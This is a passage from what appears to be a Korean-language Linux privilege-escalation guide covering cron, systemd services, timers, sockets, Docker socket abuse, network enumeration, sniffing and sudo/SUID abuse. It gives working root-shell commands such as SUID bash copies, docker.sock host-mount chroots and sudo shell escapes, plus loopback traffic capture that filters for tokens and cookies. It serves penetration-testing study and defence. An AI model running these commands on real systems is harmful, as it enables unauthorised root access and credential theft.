성공한 교체 바이너리는 ELF signer를 사용해 leak된 개인 서명 키로 서명되었습니다. 해당 [형식 문서](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)에서는 실행 파일의 `.text`에서 파생된 서명 섹션을 설명합니다. 인증서나 일치하는 문자열을 `.text_sig`에 추가하는 것만으로는 확인할 수 없는 검증기를 통과한다고 입증되지 않습니다. 쓰기 가능한 서명 바이너리가 악용 가능하다고 결론 내리기 전에 실제 예약 실행 경로, 유효한 쓰기 권한, root 실행 여부 및 검증기 정책을 확인하세요. `.text_sig` 섹션 자체는 검토를 위한 단서일 뿐입니다.

### 빈번한 cron 작업

프로세스를 모니터링해 1분, 2분 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 활용해 권한을 상승시킬 수 있을지도 모릅니다.

예를 들어, **1분 동안 0.1초마다 모니터링하고**, **실행 횟수가 적은 명령부터 정렬한 다음**, 가장 많이 실행된 명령을 삭제하려면 다음과 같이 하면 됩니다:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**다음도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (시작되는 모든 프로세스를 모니터링하고 목록으로 표시합니다).

### 공격자가 설정한 mode bits를 보존하는 root 백업 (pg_basebackup)

root 소유 cron이 사용자가 쓸 수 있는 데이터베이스 디렉터리를 대상으로 `pg_basebackup`(또는 재귀 복사)을 실행한다면, **SUID/SGID 바이너리**를 심어 백업 출력 위치에 동일한 mode bits를 유지한 **root:root** 소유 파일로 다시 복사되게 할 수 있습니다.<sup>[[26]](#references)</sup>

일반적인 발견 절차 (권한이 낮은 DB 사용자로):
- `pspy`를 사용해 root cron이 매분 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 같은 명령을 호출하는지 확인합니다.
- 원본 클러스터 (예: `/var/lib/postgresql/14/main`)를 직접 쓸 수 있는지 확인하고, 작업 실행 후 대상 (`/opt/backups/current`)이 root 소유가 되는지 확인합니다.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

이는 `pg_basebackup`이 클러스터를 복사할 때 파일 모드 비트를 보존하기 때문입니다. root로 실행하면 대상 파일은 **root 소유권 + 공격자가 선택한 SUID/SGID**를 상속합니다. 권한을 보존하면서 실행 가능한 위치에 파일을 쓰는 유사한 권한 상승 백업/복사 루틴은 모두 취약합니다.

### 보이지 않는 cron 작업

주석 뒤에 캐리지 리턴을 넣어(개행 문자 없이) cronjob을 만들 수 있으며, cron 작업은 정상적으로 실행됩니다. 예시(캐리지 리턴 문자에 유의):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

이런 종류의 은밀한 진입을 탐지하려면 제어 문자를 표시하는 도구로 cron 파일을 검사하세요:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## 서비스

### 쓰기 가능한 _.service_ 파일

`.service` 파일을 쓸 수 있는지 확인하세요. 쓸 수 있다면 서비스를 **시작**, **재시작** 또는 **중지**할 때 backdoor가 **실행되도록** 파일을 **수정할 수 있습니다**(머신이 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 `.service` 파일 안에 **`ExecStart=/tmp/script.sh`**를 넣어 backdoor를 만들 수 있습니다.

### 쓰기 가능한 서비스 바이너리

서비스가 실행하는 바이너리에 **쓰기 권한**이 있다면, 해당 바이너리를 backdoor로 바꿀 수 있습니다. 그러면 서비스를 다시 실행할 때 backdoor가 실행됩니다.

### systemd PATH - 상대 경로

다음 명령으로 **systemd**에서 사용하는 PATH를 확인할 수 있습니다:

```bash
systemctl show-environment
```

경로에 있는 폴더 중 **쓰기** 권한이 있는 폴더를 찾았다면 **권한 상승**이 가능할 수 있습니다. 다음과 같은 서비스 설정 파일에서 사용되는 **상대 경로**를 찾아야 합니다:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

그런 다음, 쓰기 권한이 있는 systemd PATH 폴더 안에 상대 경로 바이너리와 **같은 이름의 실행 파일**을 만들면, 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청될 때 **backdoor가 실행됩니다**(일반 사용자는 보통 서비스를 시작하거나 중지할 수 없지만, `sudo -l`을 사용할 수 있는지 확인하세요).

**서비스에 대한 자세한 내용은 `man systemd.service`를 참고하세요.**

## **Timers**

**Timers**는 이름이 `**.timer**`로 끝나는 systemd unit 파일로, `**.service**` 파일이나 이벤트를 제어합니다. **Timers**는 달력 기반 시간 이벤트와 단조 시간 이벤트를 기본 지원하며 비동기적으로 실행할 수 있으므로 cron의 대안으로 사용할 수 있습니다.

다음 명령으로 모든 타이머를 열거할 수 있습니다:

```bash
systemctl list-timers --all
```

### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 `.service`나 `.target` 같은 systemd.unit의 항목을 실행하도록 만들 수 있습니다.

```bash
Unit=backdoor.service
```

문서에서 Unit이 무엇인지 확인할 수 있습니다.

> 이 타이머가 만료될 때 활성화할 unit입니다. 인수는 이름이 ".timer"로 끝나지 않는 unit 이름입니다. 지정하지 않으면 이 값은 타이머 unit과 이름이 같고 접미사만 다른 service로 기본 설정됩니다. (위 내용 참조) 활성화되는 unit 이름과 타이머 unit 이름은 접미사만 다르고 동일하게 지정하는 것이 좋습니다.

따라서 이 권한을 악용하려면 다음을 수행해야 합니다.

- **쓰기 가능한 바이너리를 실행하는** systemd unit(예: `.service`) 찾기
- **상대 경로를 실행하는** systemd unit을 찾고 해당 실행 파일을 가장하기 위해 **systemd PATH**에 대한 **쓰기 권한**이 있는지 확인하기

**`man systemd.timer`에서 타이머에 대해 자세히 알아보세요.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한으로 다음을 실행해야 합니다:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`에 symlink를 생성하면 **timer**가 **활성화**됩니다.

## Sockets

Unix Domain Sockets (UDS)는 client-server 모델에서 같은 머신 또는 서로 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 컴퓨터 간 통신에 표준 Unix descriptor 파일을 사용하며, `.socket` 파일을 통해 설정됩니다.<sup>[[14]](#references)</sup>

소켓은 `.socket` 파일을 사용해 설정할 수 있습니다.

**`man systemd.socket`에서 소켓에 대해 자세히 알아보세요.** 이 파일에서는 몇 가지 흥미로운 매개변수를 설정할 수 있습니다.

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 서로 다른 옵션이지만, 소켓이 **어디에서 수신 대기할지**를 지정합니다(AF_UNIX 소켓 파일의 경로, 수신 대기할 IPv4/6 주소 및/또는 포트 번호 등).
- `Accept`: boolean 인수를 받습니다. **true**이면 **들어오는 각 연결마다 service 인스턴스가 생성**되고, 해당 인스턴스에는 연결 소켓만 전달됩니다. **false**이면 수신 대기 중인 소켓 자체가 모두 **시작된 service unit에 전달**되고, 모든 연결을 처리하는 service unit은 하나만 생성됩니다. 이 값은 하나의 service unit이 모든 수신 트래픽을 무조건 처리하는 datagram 소켓과 FIFO에서는 무시됩니다. 기본값은 **false**입니다. 성능상의 이유로, 새 daemon은 `Accept=no`에 적합한 방식으로만 작성하는 것이 좋습니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상의 명령줄을 받습니다. 이 명령은 수신 대기 중인 **소켓**/FIFO가 생성되고 bind되기 **전** 또는 **후**에 각각 **실행됩니다**. 명령줄의 첫 번째 토큰은 절대 파일 이름이어야 하며, 그 뒤에 프로세스의 인수가 올 수 있습니다.
- `ExecStopPre`, `ExecStopPost`: 수신 대기 중인 **소켓**/FIFO가 닫히고 제거되기 **전** 또는 **후**에 각각 **실행되는** 추가 **명령**입니다.
- `Service`: **들어오는 트래픽**에서 **활성화할** **service** unit 이름을 지정합니다. 이 설정은 `Accept=no`인 소켓에서만 사용할 수 있습니다. 기본값은 소켓과 이름이 같고 접미사만 바꾼 service입니다. 대부분의 경우 이 옵션은 사용할 필요가 없습니다.

### Writable .socket files

**쓰기 가능한** `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작 부분에 `ExecStartPre=/home/kali/sys/backdoor` 같은 내용을 **추가**할 수 있습니다. 그러면 소켓이 생성되기 전에 backdoor가 실행됩니다. 따라서 **머신이 재부팅될 때까지 기다려야 할 수 있습니다.**\
_시스템이 해당 소켓 파일 설정을 사용 중이어야 합니다. 그렇지 않으면 backdoor가 실행되지 않습니다._

### Socket activation + writable unit path (create missing service)

다음과 같은 심각한 오설정도 있습니다.

- `Accept=no`이고 `Service=<name>.service`인 socket unit
- 참조된 service unit이 없음
- 공격자가 `/etc/systemd/system`(또는 다른 unit 검색 경로)에 쓸 수 있음

이 경우 공격자는 `<name>.service`를 만든 다음 소켓으로 트래픽을 보내 systemd가 새 service를 root 권한으로 로드하고 실행하도록 할 수 있습니다.

간단한 흐름:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 쓰기 가능한 소켓

**쓰기 가능한 소켓을 식별하면** (_여기서는 Unix Sockets를 말하는 것이며 설정 `.socket` 파일을 말하는 것이 아닙니다_), 해당 소켓과 **통신할 수 있고** 취약점을 악용할 수도 있습니다.

### Unix Sockets 열거하기

```bash
netstat -a -p --unix
```

### 원시 연결

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP 요청을 수신 대기하는 **socket**이 있을 수 있습니다(_`.socket` 파일을 말하는 것이 아니라 unix socket 역할을 하는 파일을 말합니다_). 다음 명령으로 확인할 수 있습니다:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

소켓이 **HTTP 요청에 응답한다면**, 소켓과 **통신**할 수 있으며 어쩌면 **취약점을 악용**할 수도 있습니다.

### 쓰기 가능한 Docker 소켓

일반적으로 `/var/run/docker.sock`에 있는 Docker 소켓은 안전하게 보호해야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹 구성원이 쓸 수 있습니다. 이 소켓에 대한 쓰기 권한이 있으면 권한 상승으로 이어질 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없을 때의 대체 방법에 대한 설명입니다.

#### **Docker CLI를 이용한 권한 상승**

Docker 소켓에 대한 쓰기 권한이 있다면 다음 명령을 사용해 권한을 상승시킬 수 있습니다:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

이 명령어를 사용하면 호스트의 파일 시스템에 root 수준으로 접근할 수 있는 컨테이너를 실행할 수 있습니다.

#### **Docker API 직접 사용**

Docker CLI를 사용할 수 없는 경우에도 Unix 소켓을 통한 raw HTTP를 사용해 Docker 소켓을 악용할 수 있습니다. 가장 안정적인 흐름은 다음과 같습니다.

- 호스트 root를 bind mount한 장기 실행 helper 컨테이너 생성
- 컨테이너 시작
- helper 컨테이너 내에서 `exec` 인스턴스 생성
- `exec` 인스턴스를 시작하고 API를 통해 출력을 읽어옴

**Docker 이미지 나열**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**헬퍼 컨테이너 생성 및 시작**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**exec 인스턴스 생성**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec 인스턴스를 시작하고 출력을 읽으세요**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

이 패턴은 보통 `socat`이나 `nc -U`로 `attach`를 수동으로 조작하는 것보다 더 견고합니다. `/:/host`를 사용해 helper를 만들 수 있으면, 추가 `exec` 인스턴스를 사용해 `/host/root/...` 같은 파일을 읽거나, `/host/root/.ssh`에 SSH 키를 추가하거나, 호스트 시작 파일을 수정할 수 있습니다.

### 기타

**`docker` 그룹에 속해 있어** docker socket에 대한 쓰기 권한이 있다면 [**권한을 상승시킬 수 있는 방법이 더 있습니다**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). [**docker API가 포트에서 수신 대기 중이라면** 이 API도 침해할 수 있습니다](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**컨테이너에서 탈출하거나 컨테이너 런타임을 악용해 권한을 상승시키는 방법**은 다음을 참고하세요:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) 권한 상승

**`ctr`** 명령을 사용할 수 있다면, **이를 악용해 권한을 상승시킬 수 있으므로** 다음 페이지를 참고하세요:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 권한 상승

**`runc`** 명령을 사용할 수 있다면, **이를 악용해 권한을 상승시킬 수 있으므로** 다음 페이지를 참고하세요:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호작용하고 데이터를 공유할 수 있도록 하는 정교한 **프로세스 간 통신(IPC) 시스템**입니다. 현대적인 Linux 시스템을 염두에 두고 설계되었으며, 다양한 애플리케이션 통신을 위한 견고한 프레임워크를 제공합니다.<sup>[[16]](#references)</sup>

이 시스템은 다용도로 사용할 수 있으며, 프로세스 간 데이터 교환을 개선하는 기본적인 IPC를 지원합니다. 이는 **향상된 UNIX domain socket**과 유사합니다. 또한 이벤트나 신호를 브로드캐스트해 시스템 구성 요소 간 원활한 통합을 돕습니다. 예를 들어, Bluetooth daemon이 수신 전화에 대한 신호를 보내면 음악 플레이어가 음소거되어 사용자 경험을 향상할 수 있습니다. 더불어 D-Bus는 원격 객체 시스템을 지원해 애플리케이션 간의 서비스 요청과 메서드 호출을 단순화하고, 기존에는 복잡했던 프로세스를 간소화합니다.

D-Bus는 **허용/거부 모델**로 작동하며, 일치하는 정책 규칙의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책은 버스와의 상호작용을 지정하며, 권한을 악용하면 권한 상승이 가능할 수 있습니다.

`/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 정책의 예는 root 사용자가 `fi.w1.wpa_supplicant1`을 소유하고, 해당 대상으로 메시지를 보내고 메시지를 받을 수 있는 권한을 상세히 보여줍니다.

사용자나 그룹이 지정되지 않은 정책은 모든 사용자에게 적용되며, "default" 컨텍스트 정책은 다른 특정 정책이 적용되지 않는 모든 대상에게 적용됩니다.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus communication의 enumeration 및 exploitation 방법은 여기에서 확인하세요:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumeration하고 머신의 위치를 파악하는 것은 언제나 흥미롭습니다.

### 일반적인 enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

활성 `/etc/inetd.conf` 항목이 GNU Inetutils `telnetd`를 root로 실행한다면, 포트가 loopback에만 바인딩되어 있더라도 설정된 바이너리 버전과 로컬 리스너를 확인하세요. GNU Inetutils 1.9.3부터 2.7까지는 클라이언트가 제공한 `USER`가 `login -f`에 전달되는 [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) 취약점(CVE-2026-24061)이 있었습니다. 프로세스나 버전 문자열은 단서일 뿐입니다. 노출된 것으로 판단하기 전에 공급업체의 패치 상태와 실제 데몬을 확인하세요. 자세한 내용은 [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md)를 참조하세요.

### 아웃바운드 필터링 빠른 초기 점검

호스트에서 명령을 실행할 수 있지만 콜백이 실패한다면 DNS, 전송 계층, 프록시, 라우트 필터링을 빠르게 구분하세요:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 열린 포트

접속하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

리스너를 bind 대상별로 분류하세요.

- `0.0.0.0` / `[::]`: 모든 로컬 인터페이스에서 노출됩니다.
- `127.0.0.1` / `::1`: 로컬에서만 접근할 수 있습니다(터널링/포워딩 후보로 적합).
- 특정 내부 IP(예: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 보통 내부 네트워크 세그먼트에서만 접근할 수 있습니다.

### 로컬 전용 서비스 분류 워크플로

호스트를 장악하면 `127.0.0.1`에 바인딩된 서비스에 셸에서 처음으로 접근할 수 있게 되는 경우가 많습니다. 간단한 로컬 워크플로는 다음과 같습니다.

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### 네트워크 스캐너로서의 LinPEAS (네트워크 전용 모드)

로컬 PE 점검 외에도 linPEAS는 네트워크 스캐너로 실행할 수 있습니다. `$PATH`에서 사용 가능한 바이너리(일반적으로 `fping`, `ping`, `nc`, `ncat`)를 사용하며 도구를 설치하지 않습니다.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` 없이 `-d`, `-p` 또는 `-i`를 전달하면 linPEAS는 순수 네트워크 스캐너로 동작합니다(나머지 권한 상승 검사는 건너뜀).

### Sniffing

트래픽을 sniff할 수 있는지 확인하세요. 가능하다면 자격 증명을 획득할 수 있습니다.

```
timeout 1 tcpdump
```

빠르게 해볼 수 있는 실전 점검:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`)는 post-exploitation에서 특히 유용합니다. 많은 내부 전용 서비스가 이 인터페이스에서 tokens/cookies/credentials를 노출하기 때문입니다:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

지금 캡처하고, 나중에 파싱:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## 사용자

### 일반적인 Enumeration

자신이 **누구인지**, 어떤 **권한**을 보유하고 있는지, 시스템에 어떤 **사용자**가 있는지, 어떤 사용자가 **로그인**할 수 있는지, 그리고 어떤 사용자가 **root 권한**을 보유하고 있는지 확인하세요:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Big UID

일부 Linux 버전에는 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 버그가 있었습니다. 자세한 내용은 [여기](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [여기](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh), [여기](https://twitter.com/paragonsec/status/1071152249529884674)를 참고하세요.<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**다음 명령으로 exploit을 실행하세요**: **`systemd-run -t /bin/bash`**

### 그룹

root 권한을 얻을 수 있는 **그룹의 구성원인지** 확인하세요:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### 클립보드

클립보드에 흥미로운 내용이 있는지 확인하세요(가능한 경우)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### 비밀번호 정책

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 알려진 비밀번호

환경의 **비밀번호를 알고 있다면** 각 사용자로 해당 비밀번호를 사용해 **로그인해 보세요**.

### Su Brute

많은 흔적을 남겨도 괜찮고 컴퓨터에 `su` 및 `timeout` 바이너리가 있다면 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 사용자를 brute-force할 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)의 `-a` 매개변수도 사용자를 brute-force하려고 시도합니다.

## Writable PATH 악용

### $PATH

$PATH의 **일부 폴더에 쓸 수 있다면**, 쓰기 가능한 폴더 안에 다른 사용자(이상적으로는 root)가 실행할 명령어 이름으로 **backdoor를 생성해** 권한을 상승시킬 수 있습니다. 단, 해당 명령어가 $PATH에서 쓰기 가능한 폴더보다 앞에 있는 폴더에서 로드되지 않아야 합니다.

### SUDO 및 SUID

sudo를 사용해 일부 명령어를 실행할 수 있거나 해당 명령어에 suid 비트가 설정되어 있을 수 있습니다. 다음 명령어로 확인하세요:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

일부 **예상치 못한 명령어를 사용하면 파일을 읽거나 쓸 수 있고, 심지어 명령을 실행할 수도 있습니다**.<sup>[[8]](#references)</sup> 예를 들면:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo 설정에 따라 사용자는 비밀번호를 몰라도 다른 사용자의 권한으로 특정 명령을 실행할 수 있습니다.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

이 예제에서 사용자 `demo`는 `vim`을 `root`로 실행할 수 있으므로, root 디렉터리에 ssh key를 추가하거나 `sh`를 호출해 간단히 shell을 얻을 수 있습니다.

```
sudo vim -c '!sh'
```

### sudo 스크립트에서 따옴표로 감싸지 않은 Bash 비교

Bash에서 `[[ "$protected" == $candidate ]]`의 오른쪽은 패턴입니다. root 권한으로 실행할 수 있는 sudo 스크립트가 호출자가 제어하는 파일에서 `candidate`를 가져온다면, `prefix*`와 같은 값이 보호된 문자열의 시작 부분과 일치할 수 있습니다. 성공 경로와 오류 경로가 서로 다르면 접두사 오라클이 노출될 수도 있습니다. 리터럴 일치를 의도한 경우 오른쪽을 따옴표로 감싸세요(`[[ "$protected" == "$candidate" ]]`). 따옴표 없는 비교를 악용할 수 있다고 판단하기 전에 실제 sudo 인수, 입력의 출처, 외부에서 관찰 가능한 분기 동작을 검토하세요. [GNU Bash 매뉴얼](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)에서 이러한 패턴 동작을 설명합니다.

### sudo에서 사용하는 PrusaSlicer 프로젝트 파일

`prusaslicer` 또는 `prusa-slicer`에 제한 없이 root 권한으로 실행할 수 있는 sudo 권한이 부여되어 있다면, 호출자가 슬라이스할 `.3mf` 프로젝트를 선택할 수 있는지 검토해야 합니다. 프로젝트에는 G-code를 내보낼 때 실행되는 후처리 스크립트가 포함될 수 있습니다. 조작된 프로젝트는 2.6.1까지의 PrusaSlicer에서 명령을 실행할 수 있습니다([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). 권한 경계에 도달할 수 있다고 결론 내리기 전에 적용되는 sudo 규칙, 바이너리 버전과 벤더 패치, 프로젝트 출처, 그리고 관련 내보내기 경로가 실행되는지 확인하세요. 고정된 프로젝트 인수나 적용 중인 `NOEXEC` 정책에 따라 결과가 달라질 수 있습니다. 슬라이서가 설치되어 있다는 사실만으로 권한 상승 경로가 성립하는 것은 아닙니다.

### SETENV

이 지시어는 사용자가 어떤 항목을 실행하는 동안 **환경 변수를 설정**할 수 있도록 합니다:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

이 예시는 **HTB 머신 Admirer를 기반으로 했으며**, 스크립트를 root로 실행하는 동안 임의의 Python 라이브러리를 로드하는 **PYTHONPATH hijacking**에 **취약했습니다**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo 허용 Python import에서 쓰기 가능한 `__pycache__` / `.pyc` poisoning

**sudo가 허용된 Python 스크립트**가 패키지 디렉터리에 **쓰기 가능한 `__pycache__`**가 있는 모듈을 import한다면, 캐시된 `.pyc`를 바꿔 다음 import 시 권한이 높은 사용자로 코드 실행을 할 수 있습니다.<sup>[[30]](#references)</sup>

- 작동 원리:
